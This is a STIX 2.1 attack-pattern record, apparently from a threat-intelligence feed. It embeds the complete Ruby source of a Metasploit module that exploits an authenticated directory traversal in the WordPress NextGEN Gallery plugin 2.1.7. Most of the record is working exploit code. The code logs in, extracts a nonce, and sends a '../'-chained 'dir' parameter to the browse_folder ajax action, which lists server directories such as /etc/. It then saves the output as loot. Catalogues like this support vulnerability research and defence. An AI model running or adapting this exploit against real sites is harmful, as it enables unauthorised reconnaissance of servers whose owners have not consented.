{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6ecfa643-7bd1-4156-b377-39a6f5ed3ec7",
    "created": "2024-08-14T16:30:19.533009Z",
    "modified": "2024-08-14T16:30:19.533012Z",
    "name": "WordPress NextGEN Gallery Directory Read Vulnerability",
    "description": " This module exploits an authenticated directory traversal vulnerability in WordPress Plugin \"NextGEN Gallery\" version 2.1.7, allowing to read arbitrary directories with the web server privileges.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wp_nextgen_galley_file_read.rb",
            "external_id": "wp_nextgen_galley_file_read.rb"
        },
        {
            "source_name": "reference",
            "url": "http://permalink.gmane.org/gmane.comp.security.oss.general/17650"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'json'\nrequire 'nokogiri'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WordPress NextGEN Gallery Directory Read Vulnerability',\n      'Description'    => %q{\n        This module exploits an authenticated directory traversal vulnerability\n        in WordPress Plugin \"NextGEN Gallery\" version 2.1.7, allowing\n        to read arbitrary directories with the web server privileges.\n      },\n      'References'     =>\n        [\n          ['WPVDB', '8165'],\n          ['URL', 'http://permalink.gmane.org/gmane.comp.security.oss.general/17650']\n        ],\n      'Author'         =>\n        [\n          'Sathish Kumar', # Vulnerability Discovery\n          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module\n        ],\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        OptString.new('WP_USER', [true, 'A valid username', nil]),\n        OptString.new('WP_PASS', [true, 'Valid password for the provided username', nil]),\n        OptString.new('DIRPATH', [true, 'The path to the directory to read', '/etc/']),\n        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ])\n      ])\n  end\n\n  def user\n    datastore['WP_USER']\n  end\n\n  def password\n    datastore['WP_PASS']\n  end\n\n  def check\n    check_plugin_version_from_readme('nextgen-gallery', '2.1.9')\n  end\n\n  def get_nonce(cookie)\n    res = send_request_cgi(\n      'uri'    => normalize_uri(wordpress_url_backend, 'admin.php'),\n      'method' => 'GET',\n      'vars_get'  => {\n        'page'    => 'ngg_addgallery'\n      },\n      'cookie' => cookie\n    )\n\n    if res && res.redirect? && res.redirection\n      location = res.redirection\n      print_status(\"Following redirect to #{location}\")\n      res = send_request_cgi(\n        'uri'    => location,\n        'method' => 'GET',\n        'cookie' => cookie\n      )\n    end\n\n    res.body.scan(/var browse_params = {\"nextgen_upload_image_sec\":\"(.+)\"};/).flatten.first\n  end\n\n  def parse_paths(res)\n    begin\n      j = JSON.parse(res.body)\n    rescue JSON::ParserError => e\n      elog(e)\n      return []\n    end\n\n    html = j['html']\n    noko = Nokogiri::HTML(html)\n    links = noko.search('a')\n    links.collect { |e| normalize_uri(\"#{datastore['DIRPATH']}/#{e.text}\") }\n  end\n\n  def run_host(ip)\n    vprint_status(\"Trying to login as: #{user}\")\n    cookie = wordpress_login(user, password)\n    if cookie.nil?\n      print_error(\"Unable to login as: #{user}\")\n      return\n    end\n    store_valid_credential(user: user, private: password, proof: cookie)\n\n    vprint_status(\"Trying to get nonce...\")\n    nonce = get_nonce(cookie)\n    if nonce.nil?\n      print_error(\"Can not get nonce after login\")\n      return\n    end\n    vprint_status(\"Got nonce: #{nonce}\")\n\n    traversal = \"../\" * datastore['DEPTH']\n    filename = datastore['DIRPATH']\n    filename = filename[1, filename.length] if filename =~ /^\\//\n\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path),\n      'headers'   => {\n        'Referer' => \"http://#{rhost}/wordpress/wp-admin/admin.php?page=ngg_addgallery\",\n        'X-Requested-With' => 'XMLHttpRequest'\n      },\n      'vars_get'  => {\n        'photocrati_ajax' => '1'\n      },\n      'vars_post' => {\n        'nextgen_upload_image_sec' => \"#{nonce}\",\n        'action' => 'browse_folder',\n        'dir' => \"#{traversal}#{filename}\"\n      },\n      'cookie'    => cookie\n    )\n\n    if res && res.code == 200\n\n      paths = parse_paths(res)\n      vprint_line(paths * \"\\n\")\n\n      fname = datastore['DIRPATH']\n      path = store_loot(\n        'nextgen.traversal',\n        'text/plain',\n        ip,\n        paths * \"\\n\",\n        fname\n      )\n\n      print_good(\"File saved in: #{path}\")\n    else\n      print_error(\"Nothing was downloaded. You can try to change the DIRPATH.\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}